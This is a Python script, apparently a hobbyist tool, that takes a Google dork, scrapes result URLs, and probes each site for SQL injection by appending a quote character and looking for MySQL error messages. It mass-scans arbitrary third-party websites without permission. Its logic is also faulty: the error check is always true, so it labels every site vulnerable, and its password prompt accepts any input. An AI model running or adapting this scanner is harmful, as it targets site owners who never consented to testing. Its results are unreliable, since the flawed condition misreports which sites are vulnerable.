import json
import getpass
import requests
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
#from urllib.request import urlopen
payload = "%27"
url = "https://www.google.co.in/search?q=.php?id=1&num=100&hl=EN&start=1"
def test():
    dork = raw_input("Dork : ")
    next = 0
    while next <= 500:
        response = requests.get("https://www.google.co.in/search?q="+dork+"&num=100&hl=EN&start="+str(next))
        next = next + 10
#soup = BeautifulSoup(response.text,"lxml")
        soup = BeautifulSoup(response.content,"html5lib")
        for item in soup.select(".kCrYT a"):
            f_url = item.get('href')
            myurl = f_url.replace(f_url[:7], '')
            myurl = myurl.split('&')
            myurl = myurl[0]
            sqlcheck(myurl)
    
def sqlcheck(myurl):    
    sqlchecker = requests.get(myurl+payload, verify=False).text
    if 'mysql_fetch_array()' or 'You have an error in your SQL syntax' in sqlchecker:
        print (myurl + 'is vulnerable')
    
Passwd = getpass.getpass("Give Passwd : ")
if "" in Passwd:
	test()
else:
	exit()     